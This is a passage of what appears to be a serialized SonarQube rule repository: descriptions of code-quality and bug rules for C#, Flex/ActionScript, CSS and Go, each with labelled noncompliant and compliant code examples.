csharpsquidS40355Classes implementing "IEquatable<T>" should be sealed"MAJOR*cs:Á<p>When a class implements the <code>IEquatable&lt;T&gt;</code> interface, it enters a contract that, in effect, states "I know how to compare two
instances of type T or any type derived from T for equality.". However if that class is derived, it is very unlikely that the base class will know how
to make a meaningful comparison. Therefore that implicit contract is now broken.</p>
<p>Alternatively <code>IEqualityComparer&lt;T&gt;</code> provides a safer interface and is used by collections or <code>Equals</code> could be made
<code>virtual</code>.</p>
<p>This rule raises an issue when a unsealed, <code>public</code> or <code>protected</code> class implements <code>IEquitable&lt;T&gt;</code> and the
<code>Equals</code> is neither <code>virtual</code> nor <code>abstract</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
using System;

namespace MyLibrary
{
  class Base : IEquatable&lt;Base&gt; // Noncompliant
  {
    bool Equals(Base other)
    {
      if (other == null) { return false };
      // do comparison of base properties
    }

    override bool Equals(object other)  =&gt; Equals(other as Base);
  }

  class A : Base
  {
    bool Equals(A other)
    {
      if (other == null) { return false };
      // do comparison of A properties
      return base.Equals(other);
    }

    override bool Equals(object other)  =&gt; Equals(other as A);
  }

  class B : Base
  {
    bool Equals(B other)
    {
      if (other == null) { return false };
      // do comparison of B properties
     return base.Equals(other);
    }

    override bool Equals(object other)  =&gt; Equals(other as B);
  }

  static void Main() {
    A a = new A();
    B b = new B();

    Console.WriteLine(a.Equals(b)); // This calls the WRONG equals. This causes Base::Equals(Base)
    //  to be called which only compares the properties in Base and ignores the fact that
    // a and b are different types. In the working example A::Equals(Object) would have been
    // called and Equals would return false because it correctly recognizes that a and b are
    // different types. If a and b have the same base properties they will  be returned as equal.
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
using System;

namespace MyLibrary
{
    public sealed class Foo : IEquatable&lt;Foo&gt;
    {
        public bool Equals(Foo other)
        {
            // Your code here
        }
    }
}
</pre>
<h2>See</h2>
<p><a href="http://blog.mischel.com/2013/01/05/inheritance-and-iequatable-do-not-mix/">Inheritance and IEquatable do not mix</a></p>
<p><a href="https://msdn.microsoft.com/en-us/library/ms132151(v=vs.110).aspx">IEqualityComparer&lt;T&gt; Interface</a></p>Z
CODE_SMELL
°

flex:S1454í
flexS1454ZMultiple "++" or "--" unary operators should not be used in a single arithmetic expression"MAJOR*flex:î<p>Using several "--" or "++" unary operators in the same arithmetic expression can quickly make the expression unreadable. </p>
<h2>Noncompliant Code Example</h2>
<pre>
var j:int = foo++ - --bar;
</pre>
<h2>Compliant Solution</h2>
<pre>
bar--;
var j:int = foo++ - bar;
</pre>ZBUG
Ê	

flex:S1176◊	
flexS1176PPublic classes, methods, properties and metadata should be documented with ASDoc"MAJOR*flex:‹<p>Try to imagine using the standard Flex API without ASDoc. It would be a nightmare, because ASDoc is the only way to understand of the contract of
the API.</p>
<p>Documenting an API with ASDoc increases the productivity of the developers use it.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyClass {
  public var myLabel:String;

  public function myMethod(param1:String):Boolean {...}
}
</pre>
<h2>Compliant Solution</h2>
<pre>
/**
 * my doc
 */
public class MyClass {
  /**
   * my doc
   */
  public var myLabel:String;

  /**
   * my doc
   * @param param1 my doc
   * @return my doc
   */
  public function myMethod(param1:String):Boolean {...}
}
</pre>
<h2>Exceptions</h2>
<p>Classes or class elements with an ASDoc <code>@private</code> comment are ignored by this rule.</p>
<pre>
/**
 * @private  // This class and all its elements are ignored
 */
public class MyClass {  // Compliant

  public var myLabel:String;   // Compliant
}

public class AnotherClass {  // Noncompliant; class not @private and not documented

  /**
   * @private
   */
  public var name:String;  // Compliant
}
</pre>Z
CODE_SMELL
”
flex:LineLengthø
flex
LineLengthLines should not be too long"MAJOR*flex:t<p>Having to scroll horizontally makes it harder to get a quick overview and understanding of any piece of code.</p>Z
CODE_SMELL
¬
flex:ParsingError¨
flexParsingErrorFlex parser failure"MAJOR*flex:Á<p>When the Flex parser fails, it is possible to record the failure as a violation on the file. This way, not only it is possible to track the number
of files that do not parse but also to easily find out why they do not parse.</p>Z
CODE_SMELL
Â

flex:S1172÷
flexS1172,Unused function parameters should be removed"MAJOR*flex:ˇ
<p>Unused parameters are misleading. Whatever the value passed to such parameters is, the behavior will be the same.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function doSomething(a:int, b:int):void      // "b" is unused
{
  compute(a);
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function doSomething(a:int):void
{
  compute(a);
}
</pre>
<h2>Exceptions</h2>
<p>The following cases are ignored</p>
<ul>
  <li> event handlers. </li>
  <li> overriding methods. </li>
  <li> all methods in classes implementing one or more interfaces. </li>
  <li> methods which are empty or where the body consists of a single comment or a single <code>throw</code> statement (i.e. where the intention is
  apparently to simulate an abstract class). </li>
</ul>
<pre>
override function doSomething(a:int):void {    // ignored
  compute(a);
}

...

class AbstractSomething {
  public function doSomething(a:int) {  // ignored
    throw new IllegalOperationError("doSomething() is abstract");
  }

...

interface I {
  function action(a:int, b:int);
}

class C extends I {
  function action(a:int, b:int) { // ignored
    return doSomethignWith(a);
  }
}

function clickHandler(event:MouseEvent):void { // ignored
   trace("click");
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/NYA5">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
</ul>Z
CODE_SMELL
≥
	flex:S107•
flexS107-Functions should not have too many parameters"MAJOR*flex:Œ<p>A long parameter list can indicate that a new structure should be created to wrap the numerous parameters or that the function is doing too many
things.</p>
<h2>Noncompliant Code Example</h2>
<p>With a maximum number of 4 parameters:</p>
<pre>
public function addData(p1 : int, p2 : int, p3 : int, p4 : int, p5 : int): void  {
...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public function addData(p1 : int, p2 : int, p3 : int, p4 : int): void  {
...
}
</pre>Z
CODE_SMELL
ï
	flex:S108á
flexS108.Nested blocks of code should not be left empty"MAJOR*flex:Ø<p>Most of the time a block of code is empty when a piece of code is really missing. So such empty block must be either filled or removed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
for (var i:int = 0; i &lt; 42; i++){}  // Noncompliant

try {                               // Noncompliant
} catch (error)
{
    ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
for (var i:int = 0; i &lt; 42; i++);

for (var i:int = 0; i &lt; 42; i++) {
  trace(i);
}
</pre>
<h2>Exceptions</h2>
<p>When a block contains a comment, this block is not considered to be empty.</p>Z
CODE_SMELL
†

flex:XPathë
flexXPathTrack breaches of an XPath rule"MAJOR*flex:≈<p>This rule allows the definition of custom rules using XPath expressions.</p>
<p>Issues are created depending on the return value of the XPath expression. If the XPath expression returns:</p>
<ul>
  <li> a single or list of AST nodes, then a line issue with the given message is created for each node </li>
  <li> a boolean, then a file issue with the given message is created only if the boolean is true </li>
  <li> anything else, no issue is created </li>
</ul>
<p>Here is an example of an XPath expression to log an issue on each if statement:</p>
<pre>
//IF_STATEMENT
</pre>@Z
CODE_SMELL
ë

flex:S1467Ç
flexS1467'Constructors should not dispatch events"MAJOR*flex:∑<p>A listener can be attached to an object only after it has been constructed. So dispatching an event in a constructor is useless and error prone.
</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyClass
{
  public function MyClass()
  {
    dispatchEvent( new Event( "uselessEvent" ) );
  }
}
</pre>ZBUG
ú

flex:S1068ç
flexS1068)Unused "private" fields should be removed"MAJOR*flex:π<p>If a <code>private</code> field is declared but not used in the program, it can be considered dead code and should therefore be removed. This will
improve maintainability because developers will not wonder what the variable is used for.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyClass {
  private var foo:int = 4;                       //foo is unused

  public function compute(a:int):int{
    return a * 4;
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class MyClass {

  public function compute(a:int):int{
    return a * 4;
  }
}
</pre>Z
CODE_SMELL
í

flex:S1464É
flexS14647"ManagedEvents" tags should have companion "Event" tags"MAJOR*flex:®<p>The "ManagedEvents" metadata tag allows you to flag an event as being managed. By definition this "ManagedEvents" metadata tag should be used in
pair with an "Event" metadata tag. </p>
<h2>Noncompliant Code Example</h2>
<pre>
[Event(name="message", type="my.package.MyEvemt")]
[ManagedEvents("mes")]       //This "mes" event is not defined with the "Event" metadata tag
public class MyClass {...}
</pre>
<h2>Compliant Solution</h2>
<pre>
[Event(name="message", type="my.package.MyEvemt")]
[ManagedEvents("message")]
public class MyClass {...}
</pre>ZBUG
ò


flex:S1145â

flexS1145FUseless "if(true) {...}" and "if(false){...}" blocks should be removed"MAJOR*flex:ü	<p><code>if</code> statements with conditions that are always false have the effect of making blocks of code non-functional. <code>if</code>
statements with conditions that are always true are completely redundant, and make the code less readable.</p>
<p>There are three possible causes for the presence of such code: </p>
<ul>
  <li> An if statement was changed during debugging and that debug code has been committed. </li>
  <li> Some value was left unset. </li>
  <li> Some logic is not doing what the programmer thought it did. </li>
</ul>
<p>In any of these cases, unconditional <code>if</code> statements should be removed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (true) {
  doSomething();
}
...
if (false) {
  doSomethingElse();
}
</pre>
<h2>Compliant Solution</h2>
<pre>
doSomething();
...
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/489.html">MITRE, CWE-489</a> - Leftover Debug Code </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/570.html">MITRE, CWE-570</a> - Expression is Always False </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/571.html">MITRE, CWE-571</a> - Expression is Always True </li>
</ul>ZBUG


flex:S1144·
flexS1144,Unused "private" functions should be removed"MAJOR*flex:ä<p>Private functions that are never executed are dead code: unnecessary, inoperative code that should be removed. Cleaning out dead code decreases the
size of the maintained codebase, making it easier to understand the program and preventing bugs from being introduced.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Foo
{
  private function Foo(){}   //Compliant, private empty constructor intentionally used to prevent any direct instantiation of a class.
  public static function doSomething():void
  {
    var foo:Foo = new Foo();
    ...
  }
  private function unusedPrivateFunction():void {...}
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Foo
{
  private function Foo(){}   //Compliant, private empty constructor intentionally used to prevent any direct instantiation of a class.
  public static function doSomething():void
  {
    var foo:Foo = new Foo();
    ...
  }
}
</pre>Z
CODE_SMELL
ñ

flex:S1066á
flexS1066,Collapsible "if" statements should be merged"MAJOR*flex:∞<p>Merging collapsible <code>if</code> statements increases the code's readability.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (condition1) {
  if (condition2) {             // NonCompliant
    ...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if (condition1 &amp;&amp; condition2) {
  ...
}
</pre>Z
CODE_SMELL
∞

flex:S1142°
flexS11427Functions should not contain too many return statements"MAJOR*flex:ø<p>Having too many return statements in a function increases the function's essential complexity because the flow of execution is broken each time a
return statement is encountered. This makes it harder to read and understand the logic of the function.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default threshold of 3:</p>
<pre>
function myFunction():boolean { // Noncompliant as there are 4 return statements
  if (condition1) {
    return true;
  } else {
    if (condition2) {
      return false;
    } else {
      return true;
    }
  }
  return false;
}
</pre>Z
CODE_SMELL

flex:OneStatementPerLine”
flexOneStatementPerLine&Statements should be on separate lines"MAJOR*flex:Ù<p>For better readability, do not put more than one statement on a single line.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if(someCondition) doSomething();
</pre>
<h2>Compliant Solution</h2>
<pre>
if(someCondition) {
  doSomething();
}
</pre>Z
CODE_SMELL
“

flex:S3923√
flexS3923WAll branches in a conditional structure should not have exactly the same implementation"MAJOR*flex:»<p>Having all branches in a <code>switch</code> or <code>if</code> chain with the same implementation is an error. Either a copy-paste error was made
and something different should be executed, or there shouldn't be a <code>switch</code>/<code>if</code> chain at all.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (b == 0) {  // Noncompliant
  doOneMoreThing();
} else {
  doOneMoreThing();
}

int b = a &gt; 12 ? 4 : 4;  // Noncompliant

switch (i) {  // Noncompliant
  case 1:
    doSomething();
    break;
  case 2:
    doSomething();
    break;
  case 3:
    doSomething();
    break;
  default:
    doSomething();
}
</pre>
<h2>Exceptions</h2>
<p>This rule does not apply to <code>if</code> chains without <code>else</code>-s, or to <code>switch</code>-es without <code>default</code>
clauses.</p>
<pre>
if(b == 0) {    //no issue, this could have been done on purpose to make the code more readable
  doSomething();
} else if(b == 1) {
  doSomething();
}
</pre>ZBUG
À

flex:S1820º
flexS1820'Classes should not have too many fields"MAJOR*flex:Í<p>A class that grows too much tends to aggregate too many responsibilities and inevitably becomes harder to understand and therefore to maintain, and
having a lot of fields is an indication that a class has grown too large.</p>
<p>Above a specific threshold, it is strongly advised to refactor the class into smaller ones which focus on well defined topics.</p>Z
CODE_SMELL
µ

flex:S1871¶
flexS1871WTwo branches in a conditional structure should not have exactly the same implementation"MAJOR*flex:§<p>Having two <code>cases</code> in a <code>switch</code> statement or two branches in an <code>if</code> chain with the same implementation is at
best duplicate code, and at worst a coding error. If the same logic is truly needed for both instances, then in an <code>if</code> chain they should
be combined, or for a <code>switch</code>, one should fall through to the other. </p>
<h2>Noncompliant Code Example</h2>
<pre>
switch (i) {
  case 1:
    doFirstThing();
    doSomething();
    break;
  case 2:
    doSomethingDifferent();
    break;
  case 3:  // Noncompliant; duplicates case 1's implementation
    doFirstThing();
    doSomething();
    break;
  default:
    doTheRest();
}

if (a &gt;= 0 &amp;&amp; a &lt; 10) {
  doFirstThing();
  doTheThing();
}
else if (a &gt;= 10 &amp;&amp; a &lt; 20) {
  doTheOtherThing();
}
else if (a &gt;= 20 &amp;&amp; a &lt; 50) {
  doFirstThing();
  doTheThing();  // Noncompliant; duplicates first condition
}
else {
  doTheRest();
}
</pre>
<h2>Exceptions</h2>
<p>Blocks in an <code>if</code> chain that contain a single line of code are ignored, as are blocks in a <code>switch</code> statement that contain a
single line of code with or without a following <code>break</code>.</p>
<pre>
if(a == 1) {
  doSomething();  //no issue, usually this is done on purpose to increase the readability
} else if (a == 2) {
  doSomethingElse();
} else {
  doSomething();
}
</pre>
<p>But this exception does not apply to <code>if</code> chains without <code>else</code>-s, or to <code>switch</code>-es without default clauses when
all branches have the same single line of code. In case of <code>if</code> chains with <code>else</code>-s, or of <code>switch</code>-es with default
clauses, rule <a href='/coding_rules#rule_key=flex%3AS3923'>S3923</a> raises a bug. </p>
<pre>
if(a == 1) {
  doSomething();  //Noncompliant, this might have been done on purpose but probably not
} else if (a == 2) {
  doSomething();
}
</pre>Z
CODE_SMELL
µ

flex:S1439¶
flexS1439:Only "while", "do" and "for" statements should be labelled"MAJOR*flex:¡<p>Any statement or block of statements can be identified by a label, but those labels should be used only on <code>while</code>,
<code>do-while</code> and <code>for</code> statements. Using labels in any other context leads to unstructured, confusing code. </p>
<h2>Noncompliant Code Example</h2>
<pre>
myLabel:if (i % 2 == 0) {  // Noncompliant
  if (i == 12) {
    print("12");
    break myLabel;
  }
  print("Odd number, but not 12");
}
</pre>
<h2>Compliant Solution</h2>
<pre>
myLabel:for (i = 0; i &lt; 10; i++) {   // Compliant
  print("Loop");
  break myLabel;
}
</pre>Z
CODE_SMELL
À

flex:S1117º
flexS1117.Local variables should not shadow class fields"MAJOR*flex:„<p>Overriding or shadowing a variable declared in an outer scope can strongly impact the readability, and therefore the maintainability, of a piece of
code. Further, it could lead maintainers to introduce bugs because they think they're using one variable but are really using another.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class Foo {
  public var myField:int;

  public function doSomething():String {
    var myField:int = 0;
    ...
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/display/c/DCL01-C.+Do+not+reuse+variable+names+in+subscopes">CERT, DCL01-C.</a> - Do not reuse
  variable names in subscopes </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/display/java/DCL51-J.+Do+not+shadow+or+obscure+identifiers+in+subscopes">CERT, DCL51-J.</a> - Do
  not shadow or obscure identifiers in subscopes </li>
</ul>Z
CODE_SMELL
ì

flex:S1952Ñ
flexS19520Objects should not be instantiated inside a loop"MAJOR*flex:©<p>It can be expensive to instantiate a new object, and doing so inside a loop is typically an error. Instead, create the object once, before the
loop.</p>
<h2>Noncompliant Code Example</h2>
<pre>
for (var i:int = 0; i &lt; 10; i++) {
  var temp:MyObj = new MyObject();  // Noncompliant
  //...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
var temp:MyObj = new MyObject();
for (var i:int = 0; i &lt; 10; i++) {
  //...
}
</pre>Z
CODE_SMELL
¬
flex:CommentRegularExpression†
flexCommentRegularExpression,Track comments matching a regular expression"MAJOR*flex:¥<p>This rule template can be used to create rules which will be triggered when a comment matches a given regular expression.</p>
<p>For example, one can create a rule with the regular expression <code>.*REVIEW.*</code> to match all comment containing "REVIEW".</p>
<p>Note that, in order to match REVIEW regardless of the case, the <code>(?i)</code> modifier should be prepended to the expression, as in
<code>(?i).*REVIEW.*</code>.</p>@Z
CODE_SMELL
∂
flex:CommentedCodeü
flexCommentedCode,Sections of code should not be commented out"MAJOR*flex:¿<p>Programmers should not comment out code as it bloats programs and reduces readability.</p>
<p>Unused code should be deleted and can be retrieved from source control history if required.</p>Z
CODE_SMELL
¸
flex:WithStatementÂ
flexWithStatement$"with" statements should not be used"MAJOR*flex:ï<p>Never use <code>with</code> statements, since they decrease readability. When you do not specify a variable's scope, you do not always know where
you are setting properties, so your code can be confusing.</p>
<h2>Noncompliant Code Example</h2>
<pre>
with (foo) { // Noncompliant
  return x;  // is it a property of foo or local variable ?
}
</pre>
<h2>Compliant Solution</h2>
<pre>
return foo.x;
</pre>ZBUG
À

flex:S1151º
flexS1151<"switch case" clauses should not have too many lines of code"MAJOR*flex:’<p>The <code>switch</code> statement should be used only to clearly define some new branches in the control flow. As soon as a <code>case</code>
clause contains too many statements this highly decreases the readability of the overall control flow statement. In such case, the content of the
<code>case</code> clause should be extracted into a dedicated method.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default threshold of 5:</p>
<pre>
switch (myVariable) {
  case 0:       // Noncompliant - 6 lines till next case or default case
    trace("");
    trace("");
    trace("");
    trace("");
    break;
  case 1:
  ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
switch (myVariable) {
  case 0:
    printSomething()
    break;
  case 1:
  ...
}
...
private function printSomething() {
  trace("");
  trace("");
  trace("");
  trace("");
}
</pre>Z
CODE_SMELL
ã

flex:S1470¸
flexS1470;Classes that extend "Event" should override "Event.clone()""MAJOR*flex:ù<p>Overriding Event.clone() is a required part of the API contract:</p>
<blockquote>
  <p>You are required to override the Event.clone() method in your Event subclass. The clone() method returns a cloned copy of the event object by
  setting the type property and any new properties in the clone. Typically, you define the clone() method to return an event instance created with the
  new operator.</p>
</blockquote>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyEvent extends Event {...}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class MyEvent extends Event
{
...
  override public function clone():Event {
    return new MyEvent(...);
  }
...
}
</pre>ZBUG
È	
	flex:S127€	
flexS127."for" loop stop conditions should be invariant"MAJOR*flex:É	<p>A <code>for</code> loop stop condition should test the loop counter against an invariant value (i.e. one that is true at both the beginning and
ending of every loop iteration). Ideally, this means that the stop condition is set to a local variable just before the loop begins. </p>
<p>Stop conditions that are not invariant are slightly less efficient, as well as being difficult to understand and maintain, and likely lead to the
introduction of errors in the future.</p>
<p>This rule tracks three types of non-invariant stop conditions:</p>
<ul>
  <li> When the loop counters are updated in the body of the <code>for</code> loop </li>
  <li> When the stop condition depend upon a method call </li>
  <li> When the stop condition depends on an object property, since such properties could change during the execution of the loop. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
for (var i = 0; i &lt; 10; i++) {
  ...
  i = i - 1; // Noncompliant
  ...
}

for (var i = 0; i &lt; getMaximumNumber(); i++) {...}
</pre>
<h2>Compliant Solution</h2>
<pre>
int stopCondition = getMaximumNumber();
for (var i = 0; i &lt; stopCondition; i++) {...}
</pre>Z
CODE_SMELL
’
flex:ActionScript2æ
flexActionScript2PStatements, operators and keywords specific to ActionScript 2 should not be used"MAJOR*flex:ª
<p>Usage of statements, operators and keywords specific to ActionScript 2 does not allow to migrate to ActionScript 3. This includes "intrinsic"
keyword, set variable statement and following list of operators:</p>
<ul>
  <li> <code>&lt;&gt;</code> (inequality) - use <code>!=</code> instead </li>
  <li> <code>add</code> (concatenation (strings)) - use <code>+</code> instead </li>
  <li> <code>eq</code> (equality (strings)) - use <code>==</code> instead </li>
  <li> <code>ne</code> (not equal (strings)) - use <code>!=</code> instead </li>
  <li> <code>lt</code> (less than (strings)) - use <code>&lt;</code> instead </li>
  <li> <code>le</code> (less than or equal to (strings)) - use <code>&lt;=</code> instead </li>
  <li> <code>gt</code> (greater than (strings)) - use <code>&gt;</code> instead </li>
  <li> <code>ge</code> (greater than or equal to (strings)) - use <code>&gt;=</code> instead </li>
  <li> <code>and</code> (logical and) - use <code>&amp;&amp;</code> instead </li>
  <li> <code>or</code> (logical or) - use <code>||</code> instead </li>
  <li> <code>not</code> (logical not) - use <code>!</code> instead </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
if (true != false) { // Compliant
}

if (true &lt;&gt; false) { // Noncompliant
}

set("varName", value); // Noncompliant
varName = value; // Compliant
</pre>Z
CODE_SMELL
ÿ

flex:S1440…
flexS14407"===" and "!==" should be used instead of "==" and "!=""MAJOR*flex:Á<p>The <code>==</code> and <code>!=</code> operators do type coercion before comparing values. This is bad because it can mask type errors. For
example, it evaluates <code>' \t\r\n' == 0</code> as <code>true</code>.</p>
<p>It is best to always use the side-effect-less <code>===</code> and <code>!==</code> operators instead.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (var == 'howdy') {...} // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
if (var === 'howdy') {...}
</pre>Z
CODE_SMELL
˜

flex:S1448Ë
flexS1448(Classes should not have too many methods"MAJOR*flex:ï<p>A class that grows too much tends to aggregate too many responsibilities and inevitably becomes harder to understand and therefore to maintain.
Above a specific threshold, it is strongly advised to refactor the class into smaller ones which focus on well defined topics.</p>Z
CODE_SMELL
›

flex:S1447Œ
flexS14477Constructor bodies should be as lightweight as possible"MAJOR*flex:Ï<p>In ActionScript 3, constructor code is always interpreted rather than compiled by the JIT at runtime, which is why the body of a constructor should
be as lightweight as possible. As soon as a constructor contains branches ("if", "for", "switch", ...) an issue is logged.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Foo
{
  public function Foo()
  {
    if (condition) {  // Noncompliant
      // ...
    }
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Foo
{
  public function Foo()
  {
    init()
  }

  private function init():void
  {
    if (condition) {
      // ...
    }
  }
}
</pre>Z
CODE_SMELL
Ñ
	flex:S138ˆ
flexS1380Functions should not have too many lines of code"MAJOR*flex:ú<p>A function that grows too large tends to aggregate too many responsibilities.</p>
<p>Such functions inevitably become harder to understand and therefore harder to maintain. </p>
<p>Above a specific threshold, it is strongly advised to refactor into smaller functions which focus on well-defined tasks.</p>
<p>Those smaller functions will not only be easier to understand, but also probably easier to test.</p>Z
CODE_SMELL
Ø
common-css:FailedUnitTestsê

common-cssFailedUnitTests!Failed unit tests should be fixed"MAJOR*css:ºTest failures or errors generally indicate that regressions have been introduced. Those tests should be handled as soon as possible to reduce the cost to fix the corresponding regressions.ZBUG
å
common-css:SkippedUnitTestsÏ

common-cssSkippedUnitTests4Skipped unit tests should be either removed or fixed"MAJOR*css:~Skipped unit tests are considered as dead code. Either they should be activated again (and updated) or they should be removed.Z
CODE_SMELL

common-css:DuplicatedBlocks–

common-cssDuplicatedBlocks2Source files should not have any duplicated blocks"MAJOR*css:dAn issue is created on a file as soon as there is at least one block of duplicated code on this fileZ
CODE_SMELL
ö
%common-css:InsufficientCommentDensity

common-cssInsufficientCommentDensity>Source files should have a sufficient density of comment lines"MAJOR*css:ÌAn issue is created on a file as soon as the density of comment lines on this file is less than the required threshold. The number of comment lines to be written in order to reach the required threshold is provided by each issue message.Z
CODE_SMELL
⁄
#common-css:InsufficientLineCoverage≤

common-cssInsufficientLineCoverage.Lines should have sufficient coverage by tests"MAJOR*css:¡An issue is created on a file as soon as the line coverage on this file is less than the required threshold. It gives the number of lines to be covered in order to reach the required threshold.Z
CODE_SMELL
Ê
%common-css:InsufficientBranchCoverageº

common-cssInsufficientBranchCoverage1Branches should have sufficient coverage by tests"MAJOR*css:∆An issue is created on a file as soon as the branch coverage on this file is less than the required threshold. It gives the number of branches to be covered in order to reach the required threshold.Z
CODE_SMELL
È
go:S1134‹
goS1134Track uses of "FIXME" tags"MAJOR*go:õ<p><code>FIXME</code> tags are commonly used to mark places where a bug is suspected, but which the developer wants to deal with later.</p>
<p>Sometimes the developer will not have the time or will simply forget to get back to that tag.</p>
<p>This rule is meant to track those tags and to ensure that they do not go unnoticed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
func foo() {
  // FIXME
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/546.html">MITRE, CWE-546</a> - Suspicious Comment </li>
</ul>Z
CODE_SMELL
»

go:S1871ª

goS1871WTwo branches in a conditional structure should not have exactly the same implementation"MAJOR*go:Ω	<p>Having two <code>cases</code> in a <code>switch</code> statement or two branches in an <code>if</code> chain with the same implementation is at
best duplicate code, and at worst a coding error. If the same logic is truly needed for both instances, then in an <code>if</code> chain they should
be combined, or for a <code>switch</code>, one should fall through to the other. </p>
<h2>Noncompliant Code Example</h2>
<pre>
switch i {
case 1:
	doFirstThing()
	doSomething()
case 2:
	doSomethingElse()
case 3: // Noncompliant; duplicates case 1's implementation
	doFirstThing()
	doSomething()
default:
	doTheRest()
}

if a &gt;= 0 &amp;&amp; a &lt; 10 {
	doFirstThing()
	doSomething()
} else if a &gt;= 10 &amp;&amp; a &lt; 20 {
	doSomethingElse()
} else if a &gt;= 20 &amp;&amp; a &lt; 50 {
	doFirstThing()
	doSomething() // Noncompliant; duplicates first condition
} else {
	doTheRest()
}
</pre>
<h2>Exceptions</h2>
<p>Blocks in an <code>if</code> chain or <code>case</code> blocks that contain a single line of code are ignored.</p>
<pre>
if a == 1 {
  doSomething()  //no issue, usually this is done on purpose to increase the readability
} else if a == 2 {
  doSomethingElse()
} else {
  doSomething()
}
</pre>Z
CODE_SMELL
Ó
go:S1110·
goS11100Redundant pairs of parentheses should be removed"MAJOR*go:ä<p>The use of parentheses, even those not required to enforce a desired order of operations, can clarify the intent behind a piece of code. But
redundant pairs of parentheses could be misleading, and should be removed. </p>
<h2>Noncompliant Code Example</h2>
<pre>
func foo(a bool, y int) int {
  x := (y / 2 + 1)   //Compliant even if the parenthesis are ignored by the compiler

  if a &amp;&amp; ((x+y &gt; 0)) {  // Noncompliant
    //...
  }

  return ((x + 1))  // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
func foo(a bool, y int) int {
  x := (y / 2 + 1)

  if a &amp;&amp; (x+y &gt; 0) {
    //...
  }

  return (x + 1)
}
</pre>Z
CODE_SMELL
”
go:S4144∆
goS41443Functions should not have identical implementations"MAJOR*go:Ï<p>When two functions have the same implementation, either it was a mistake - something else was intended - or the duplication was intentional, but
may be confusing to maintainers. In the latter case, one implementation should invoke the other.</p>
<h2>Noncompliant Code Example</h2>
<pre>
func fun1() (x, y int) {
  a, b := 1, 2
  b, a = a, b
  return a, b
}

func fun2() (x, y int) {  // Noncompliant; fun1 and fun2 have identical implementations
  a, b := 1, 2
  b, a = a, b
  return a, b
}
</pre>
<h2>Compliant Solution</h2>
<pre>
func fun1() (x, y int) {
  a, b := 1, 2
  b, a = a, b
  return a, b
}

func fun2() (x, y int) {  // Compliant
  return fun1()
}
</pre>
<h2>Exceptions</h2>
<p>Functions with fewer than 2 statements are ignored.</p>Z
CODE_SMELL
∑
go:ParsingError£
goParsingErrorTrack parsing failures"MAJOR*go:ﬂ<p>When the parser fails, it is possible to record the failure as an issue on the file. This way, not only is it possible to track the number of files
that do not parse but also to easily find out why they do not parse.</p>Z
CODE_SMELL
Ã
go:S1656ø
goS1656%Variables should not be self-assigned"MAJOR*go:˙<p>There is no reason to re-assign a variable to itself. Either this statement is redundant and should be removed, or the re-assignment is a mistake
and some other value or variable was intended for the assignment instead.</p>
<h2>Noncompliant Code Example</h2>
<pre>
func (user *User) rename(name string) {
  name = name  // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
func (user *User) rename(name string) {
  user.name = name
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/NYA5">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
</ul>ZBUG
”
go:S1479∆
goS1479;"switch" statements should not have too many "case" clauses"MAJOR*go:‰<p>When <code>switch</code> statements have large sets of <code>case</code> clauses, it is usually an attempt to map two sets of data. A real map
structure would be more readable and maintainable, and should be used instead.</p>Z
CODE_SMELL
¡
go:S103µ
goS103Lines should not be too long"MAJOR*go:t<p>Having to scroll horizontally makes it harder to get a quick overview and understanding of any piece of code.</p>Z
CODE_SMELL
·
go:S1151‘
goS11514"switch case" clauses should not have too many lines"MAJOR*go:˘<p>The <code>switch</code> statement should be used only to clearly define some new branches in the control flow. As soon as a <code>case</code>
clause contains too many statements this highly decreases the readability of the overall control flow statement. In such case, the content of the
<code>case</code> clause should be extracted into a dedicated method.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default threshold of 5:</p>
<pre>
func foo(tag int) {
	switch tag {
	case 0:
		methodCall1()
		methodCall2()
		methodCall3()
		methodCall4()
                methodCall5()
                methodCall6()
	case 1:
		bar()
	}
}
</pre>
<h2>Compliant Solution</h2>
<pre>
func foo(tag int) {
	switch tag {
	case 0:
		executeAll()
